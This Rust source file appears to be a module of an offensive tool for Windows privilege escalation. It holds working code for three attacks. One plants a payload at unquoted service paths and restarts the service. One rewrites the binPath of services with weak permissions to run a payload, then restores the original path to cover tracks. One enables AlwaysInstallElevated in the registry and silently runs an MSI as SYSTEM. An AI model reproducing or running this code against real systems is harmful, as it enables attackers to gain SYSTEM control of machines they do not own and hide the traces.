//! Service configuration vulnerability exploitation
//! Unquoted service paths, weak service permissions, AlwaysInstallElevated

use crate::error::MemoricError;
use serde_json::Value;

/// Scan for unquoted service paths and optionally exploit them
/// Services with spaces in unquoted paths allow DLL/EXE planting
pub fn unquoted_service_path(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Services::{
        EnumServicesStatusExW, OpenSCManagerW, OpenServiceW, QueryServiceConfigW,
        ENUM_SERVICE_STATUS_PROCESSW, QUERY_SERVICE_CONFIGW, SC_MANAGER_ENUMERATE_SERVICE,
        SERVICE_QUERY_CONFIG, SERVICE_STATE_ALL, SERVICE_WIN32,
    };

    let exploit = args
        .get("exploit")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let payload_path = args.get("payload_path").and_then(|v| v.as_str());

    tracing::warn!("[PRIVESC] Scanning for unquoted service paths");

    unsafe {
        let scm = OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

        // Enumerate all services
        let mut bytes_needed = 0u32;
        let mut services_returned = 0u32;
        let mut resume_handle = 0u32;

        let _ = EnumServicesStatusExW(
            scm,
            windows::Win32::System::Services::SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            None,
            &mut bytes_needed,
            &mut services_returned,
            Some(&mut resume_handle),
            None,
        );

        let mut buf = vec![0u8; bytes_needed as usize];
        EnumServicesStatusExW(
            scm,
            windows::Win32::System::Services::SC_ENUM_PROCESS_INFO,
            SERVICE_WIN32,
            SERVICE_STATE_ALL,
            Some(&mut buf),
            &mut bytes_needed,
            &mut services_returned,
            Some(&mut resume_handle),
            None,
        )
        .map_err(|e| MemoricError::WindowsApi(format!("EnumServicesStatusEx: {}", e)))?;

        let services = std::slice::from_raw_parts(
            buf.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
            services_returned as usize,
        );

        let mut vulnerable = Vec::new();

        for svc in services {
            let svc_name = svc.lpServiceName.to_string().unwrap_or_default();

            if let Ok(service) = OpenServiceW(scm, svc.lpServiceName, SERVICE_QUERY_CONFIG) {
                let mut config_size = 0u32;
                let _ = QueryServiceConfigW(service, None, 0, &mut config_size);

                if config_size > 0 {
                    let mut config_buf = vec![0u8; config_size as usize];
                    if QueryServiceConfigW(
                        service,
                        Some(config_buf.as_mut_ptr() as *mut QUERY_SERVICE_CONFIGW),
                        config_size,
                        &mut config_size,
                    )
                    .is_ok()
                    {
                        let config = &*(config_buf.as_ptr() as *const QUERY_SERVICE_CONFIGW);
                        if !config.lpBinaryPathName.is_null() {
                            let bin_path = config.lpBinaryPathName.to_string().unwrap_or_default();

                            // Check if path has spaces and is NOT quoted
                            if bin_path.contains(' ') && !bin_path.starts_with('"') {
                                // Find exploitable path segments
                                let exploitable_paths = find_exploitable_segments(&bin_path);

                                vulnerable.push(serde_json::json!({
                                    "service_name": svc_name,
                                    "binary_path": bin_path,
                                    "exploitable_paths": exploitable_paths,
                                    "start_type": config.dwStartType.0,
                                }));
                            }
                        }
                    }
                }
                windows::Win32::System::Services::CloseServiceHandle(service).ok();
            }
        }

        windows::Win32::System::Services::CloseServiceHandle(scm).ok();

        // Exploit: plant payload at first writable exploitable path
        let mut exploited = false;
        let mut exploit_path = String::new();
        let mut service_restarted = false;
        let mut exploited_service = String::new();
        if exploit && !vulnerable.is_empty() {
            if let Some(payload) = payload_path {
                for vuln in &vulnerable {
                    if let Some(paths) = vuln.get("exploitable_paths").and_then(|v| v.as_array()) {
                        for path in paths {
                            if let Some(p) = path.as_str() {
                                // Check if parent directory is writable
                                let parent = std::path::Path::new(p).parent();
                                if let Some(parent_dir) = parent {
                                    if parent_dir.exists() {
                                        if let Ok(_) = std::fs::copy(payload, p) {
                                            exploited = true;
                                            exploit_path = p.to_string();
                                            exploited_service = vuln
                                                .get("service_name")
                                                .and_then(|v| v.as_str())
                                                .unwrap_or("")
                                                .to_string();
                                            break;
                                        }
                                    }
                                }
                            }
                        }
                        if exploited {
                            break;
                        }
                    }
                }
            }
        }

        // After payload planted, restart the service to trigger execution
        if exploited && !exploited_service.is_empty() {
            let restart = args
                .get("restart_service")
                .and_then(|v| v.as_bool())
                .unwrap_or(true);
            if restart {
                use windows::Win32::System::Services::{
                    ControlService, OpenServiceW, StartServiceW, SERVICE_START, SERVICE_STATUS,
                    SERVICE_STOP,
                };
                let svc_w: Vec<u16> = format!("{}\0", exploited_service).encode_utf16().collect();
                if let Ok(svc_handle) = OpenServiceW(
                    scm,
                    windows::core::PCWSTR(svc_w.as_ptr()),
                    SERVICE_STOP | SERVICE_START,
                ) {
                    // Try to stop the service first
                    let mut status = SERVICE_STATUS::default();
                    let _ = ControlService(
                        svc_handle,
                        windows::Win32::System::Services::SERVICE_CONTROL_STOP,
                        &mut status,
                    );

                    // Wait for stop
                    std::thread::sleep(std::time::Duration::from_millis(2000));

                    // Start the service — this triggers the planted payload
                    let svc_args: Option<&[windows::core::PCWSTR]> = None;
                    if StartServiceW(svc_handle, svc_args).is_ok() {
                        service_restarted = true;
                        tracing::warn!(
                            "[PRIVESC] Service '{}' restarted — payload at '{}' should execute",
                            exploited_service,
                            exploit_path
                        );
                    }
                    windows::Win32::System::Services::CloseServiceHandle(svc_handle).ok();
                }
            }
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "unquoted_service_path",
            "vulnerable_services": vulnerable.len(),
            "services": vulnerable,
            "exploited": exploited,
            "exploit_path": exploit_path,
            "exploited_service": exploited_service,
            "service_restarted": service_restarted,
            "message": if service_restarted {
                format!("Payload planted at '{}' and service '{}' restarted — exploitation complete", exploit_path, exploited_service)
            } else if exploited {
                format!("Payload planted at '{}'. Service restart pending.", exploit_path)
            } else {
                format!("Found {} services with unquoted paths", vulnerable.len())
            }
        }))
    }
}

fn find_exploitable_segments(path: &str) -> Vec<String> {
    let mut segments = Vec::new();
    // For "C:\Program Files\Some App\service.exe"
    // Exploitable: C:\Program.exe, C:\Program Files\Some.exe
    let parts: Vec<&str> = path.split('\\').collect();
    let mut current = String::new();

    for (i, part) in parts.iter().enumerate() {
        if i == 0 {
            current = part.to_string();
            continue;
        }

        current.push('\\');
        if part.contains(' ') && i < parts.len() - 1 {
            // Split at the space
            if let Some(first_word) = part.split(' ').next() {
                let candidate = format!("{}{}.exe", current, first_word);
                segments.push(candidate);
            }
        }
        current.push_str(part);
    }

    segments
}

/// Scan for services with weak permissions (modifiable by current user)
/// If found, modify binPath to execute attacker payload
pub fn weak_service_permissions(args: &Value) -> Result<Value, MemoricError> {
    use windows::Win32::System::Services::{
        ChangeServiceConfigW, ControlService, EnumServicesStatusExW, OpenSCManagerW, OpenServiceW,
        QueryServiceConfigW, StartServiceW, ENUM_SERVICE_STATUS_PROCESSW, QUERY_SERVICE_CONFIGW,
        SC_MANAGER_ENUMERATE_SERVICE, SERVICE_CHANGE_CONFIG, SERVICE_NO_CHANGE,
        SERVICE_QUERY_CONFIG, SERVICE_START, SERVICE_STATE_ALL, SERVICE_STATUS, SERVICE_STOP,
        SERVICE_WIN32,
    };

    let exploit = args
        .get("exploit")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);
    let payload = args.get("payload").and_then(|v| v.as_str());
    let target_service = args.get("service_name").and_then(|v| v.as_str());

    tracing::warn!("[PRIVESC] Scanning for weak service permissions");

    unsafe {
        let scm = OpenSCManagerW(None, None, SC_MANAGER_ENUMERATE_SERVICE)
            .map_err(|e| MemoricError::WindowsApi(format!("OpenSCManager: {}", e)))?;

        let mut vulnerable = Vec::new();

        // If specific service requested, check only that
        let service_names: Vec<String> = if let Some(name) = target_service {
            vec![name.to_string()]
        } else {
            // Enumerate all services
            let mut bytes_needed = 0u32;
            let mut services_returned = 0u32;
            let mut resume_handle = 0u32;

            let _ = EnumServicesStatusExW(
                scm,
                windows::Win32::System::Services::SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_STATE_ALL,
                None,
                &mut bytes_needed,
                &mut services_returned,
                Some(&mut resume_handle),
                None,
            );

            let mut buf = vec![0u8; bytes_needed as usize];
            let _ = EnumServicesStatusExW(
                scm,
                windows::Win32::System::Services::SC_ENUM_PROCESS_INFO,
                SERVICE_WIN32,
                SERVICE_STATE_ALL,
                Some(&mut buf),
                &mut bytes_needed,
                &mut services_returned,
                Some(&mut resume_handle),
                None,
            );

            let services = std::slice::from_raw_parts(
                buf.as_ptr() as *const ENUM_SERVICE_STATUS_PROCESSW,
                services_returned as usize,
            );

            services
                .iter()
                .filter_map(|s| s.lpServiceName.to_string().ok())
                .collect()
        };

        for svc_name in &service_names {
            let name_w: Vec<u16> = format!("{}\0", svc_name).encode_utf16().collect();

            // Try to open with SERVICE_CHANGE_CONFIG — if we can, it's vulnerable
            if let Ok(service) = OpenServiceW(
                scm,
                windows::core::PCWSTR(name_w.as_ptr()),
                SERVICE_QUERY_CONFIG | SERVICE_CHANGE_CONFIG | SERVICE_STOP | SERVICE_START,
            ) {
                // Get current config
                let mut config_size = 0u32;
                let _ = QueryServiceConfigW(service, None, 0, &mut config_size);

                let mut original_path = String::new();
                if config_size > 0 {
                    let mut config_buf = vec![0u8; config_size as usize];
                    if QueryServiceConfigW(
                        service,
                        Some(config_buf.as_mut_ptr() as *mut QUERY_SERVICE_CONFIGW),
                        config_size,
                        &mut config_size,
                    )
                    .is_ok()
                    {
                        let config = &*(config_buf.as_ptr() as *const QUERY_SERVICE_CONFIGW);
                        if !config.lpBinaryPathName.is_null() {
                            original_path = config.lpBinaryPathName.to_string().unwrap_or_default();
                        }
                    }
                }

                let mut entry = serde_json::json!({
                    "service_name": svc_name,
                    "original_path": original_path,
                    "modifiable": true,
                });

                // Exploit: change binPath to payload
                if exploit {
                    if let Some(cmd) = payload {
                        let new_path: Vec<u16> = format!("{}\0", cmd).encode_utf16().collect();
                        let change_result = ChangeServiceConfigW(
                            service,
                            windows::Win32::System::Services::ENUM_SERVICE_TYPE(SERVICE_NO_CHANGE),
                            windows::Win32::System::Services::SERVICE_START_TYPE(SERVICE_NO_CHANGE),
                            windows::Win32::System::Services::SERVICE_ERROR(SERVICE_NO_CHANGE),
                            windows::core::PCWSTR(new_path.as_ptr()),
                            None,
                            None,
                            None,
                            None,
                            None,
                            None,
                        );

                        entry["exploited"] = serde_json::json!(change_result.is_ok());
                        entry["new_path"] = serde_json::json!(cmd);

                        // Restart service to trigger the payload
                        if change_result.is_ok() {
                            let restart = args
                                .get("restart_service")
                                .and_then(|v| v.as_bool())
                                .unwrap_or(true);
                            if restart {
                                let mut status = SERVICE_STATUS::default();
                                let _ = ControlService(
                                    service,
                                    windows::Win32::System::Services::SERVICE_CONTROL_STOP,
                                    &mut status,
                                );
                                std::thread::sleep(std::time::Duration::from_millis(2000));
                                let svc_args: Option<&[windows::core::PCWSTR]> = None;
                                let restarted = StartServiceW(service, svc_args).is_ok();
                                entry["service_restarted"] = serde_json::json!(restarted);
                                if restarted {
                                    tracing::warn!(
                                        "[PRIVESC] Service '{}' restarted with payload '{}'",
                                        svc_name,
                                        cmd
                                    );
                                }

                                // Restore original path to cover tracks
                                if !original_path.is_empty() {
                                    std::thread::sleep(std::time::Duration::from_millis(1000));
                                    let restore_w: Vec<u16> =
                                        format!("{}\0", original_path).encode_utf16().collect();
                                    let _ = ChangeServiceConfigW(
                                        service,
                                        windows::Win32::System::Services::ENUM_SERVICE_TYPE(
                                            SERVICE_NO_CHANGE,
                                        ),
                                        windows::Win32::System::Services::SERVICE_START_TYPE(
                                            SERVICE_NO_CHANGE,
                                        ),
                                        windows::Win32::System::Services::SERVICE_ERROR(
                                            SERVICE_NO_CHANGE,
                                        ),
                                        windows::core::PCWSTR(restore_w.as_ptr()),
                                        None,
                                        None,
                                        None,
                                        None,
                                        None,
                                        None,
                                    );
                                    entry["path_restored"] = serde_json::json!(true);
                                }
                            }
                        }
                    }
                }

                vulnerable.push(entry);
                windows::Win32::System::Services::CloseServiceHandle(service).ok();
            }
        }

        windows::Win32::System::Services::CloseServiceHandle(scm).ok();

        Ok(serde_json::json!({
            "success": true,
            "technique": "weak_service_permissions",
            "vulnerable_services": vulnerable.len(),
            "services": vulnerable,
            "message": format!("Found {} services with modifiable configs", vulnerable.len())
        }))
    }
}

/// AlwaysInstallElevated — abuse MSI installer to get SYSTEM
/// If both HKLM and HKCU AlwaysInstallElevated=1, any MSI runs as SYSTEM
pub fn always_install_elevated(args: &Value) -> Result<Value, MemoricError> {
    use windows::core::PCWSTR;
    use windows::Win32::System::Registry::{
        RegCreateKeyExW, RegOpenKeyExW, RegQueryValueExW, RegSetValueExW, HKEY_CURRENT_USER,
        HKEY_LOCAL_MACHINE, KEY_READ, KEY_SET_VALUE, REG_DWORD, REG_OPTION_NON_VOLATILE,
    };

    let check_only = args
        .get("check_only")
        .and_then(|v| v.as_bool())
        .unwrap_or(true);
    let msi_path = args.get("msi_path").and_then(|v| v.as_str());
    let enable = args
        .get("enable")
        .and_then(|v| v.as_bool())
        .unwrap_or(false);

    tracing::warn!("[PRIVESC] AlwaysInstallElevated check/exploit");

    let policies_path: Vec<u16> = "SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\0"
        .encode_utf16()
        .collect();
    let value_name: Vec<u16> = "AlwaysInstallElevated\0".encode_utf16().collect();

    unsafe {
        // Check HKLM
        let mut hklm_enabled = false;
        let mut hkey = Default::default();
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            PCWSTR(policies_path.as_ptr()),
            0,
            KEY_READ,
            &mut hkey,
        )
        .ok()
        .is_ok()
        {
            let mut val: u32 = 0;
            let mut size = 4u32;
            if RegQueryValueExW(
                hkey,
                PCWSTR(value_name.as_ptr()),
                None,
                None,
                Some((&mut val as *mut u32 as *mut u8).as_mut().unwrap()),
                Some(&mut size),
            )
            .ok()
            .is_ok()
            {
                hklm_enabled = val == 1;
            }
            let _ = windows::Win32::System::Registry::RegCloseKey(hkey);
        }

        // Check HKCU
        let mut hkcu_enabled = false;
        let mut hkey2 = Default::default();
        if RegOpenKeyExW(
            HKEY_CURRENT_USER,
            PCWSTR(policies_path.as_ptr()),
            0,
            KEY_READ,
            &mut hkey2,
        )
        .ok()
        .is_ok()
        {
            let mut val: u32 = 0;
            let mut size = 4u32;
            if RegQueryValueExW(
                hkey2,
                PCWSTR(value_name.as_ptr()),
                None,
                None,
                Some((&mut val as *mut u32 as *mut u8).as_mut().unwrap()),
                Some(&mut size),
            )
            .ok()
            .is_ok()
            {
                hkcu_enabled = val == 1;
            }
            let _ = windows::Win32::System::Registry::RegCloseKey(hkey2);
        }

        let both_enabled = hklm_enabled && hkcu_enabled;

        // Enable if requested (requires admin for HKLM)
        if enable && !both_enabled {
            for hive in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
                let mut hkey3 = Default::default();
                let mut disp = 0u32;
                if RegCreateKeyExW(
                    hive,
                    PCWSTR(policies_path.as_ptr()),
                    0,
                    None,
                    REG_OPTION_NON_VOLATILE,
                    KEY_SET_VALUE,
                    None,
                    &mut hkey3,
                    Some(&mut disp as *mut u32 as *mut _),
                )
                .ok()
                .is_ok()
                {
                    let val: u32 = 1;
                    let _ = RegSetValueExW(
                        hkey3,
                        PCWSTR(value_name.as_ptr()),
                        0,
                        REG_DWORD,
                        Some(std::slice::from_raw_parts(
                            &val as *const u32 as *const u8,
                            4,
                        )),
                    );
                    let _ = windows::Win32::System::Registry::RegCloseKey(hkey3);
                }
            }
        }

        // Execute MSI if both enabled and path provided
        let mut msi_executed = false;
        if (both_enabled || enable) && msi_path.is_some() {
            if let Some(msi) = msi_path {
                let result = std::process::Command::new("msiexec")
                    .args(["/i", msi, "/quiet", "/qn"])
                    .spawn();
                msi_executed = result.is_ok();
            }
        }

        Ok(serde_json::json!({
            "success": true,
            "technique": "always_install_elevated",
            "hklm_enabled": hklm_enabled,
            "hkcu_enabled": hkcu_enabled,
            "both_enabled": both_enabled,
            "exploitable": both_enabled,
            "enabled_now": enable,
            "msi_executed": msi_executed,
            "message": if both_enabled {
                "AlwaysInstallElevated is ENABLED — any MSI runs as SYSTEM!".to_string()
            } else {
                format!("AlwaysInstallElevated: HKLM={}, HKCU={}", hklm_enabled, hkcu_enabled)
            }
        }))
    }
}
